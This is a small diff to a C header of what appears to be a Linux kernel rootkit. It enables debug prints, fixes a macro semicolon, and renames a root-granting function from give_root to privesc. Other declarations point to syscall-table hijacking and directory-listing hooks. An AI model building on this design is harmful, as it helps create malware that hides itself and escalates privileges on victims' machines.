@@ -6,8 +6,10 @@ void protect_memory(unsigned long val);
 void get_kallsyms_funcptr(void);
 void get_syscall_table(void);
 
+#define DEBUG_PRINTS
+
 #ifdef DEBUG_PRINTS
-    #define m_printd(fmt, ...) { printk(fmt, ##__VA_ARGS__) }
+    #define m_printd(fmt, ...) { printk(fmt, ##__VA_ARGS__); }
 #else
     #define m_printd(fmt, ...)
 #endif //DEBUG_PRINTS
@@ -38,5 +40,5 @@ struct linux_dirent
 };
 
 // Funny function :)
-void give_root(void);
+void privesc(void);
 
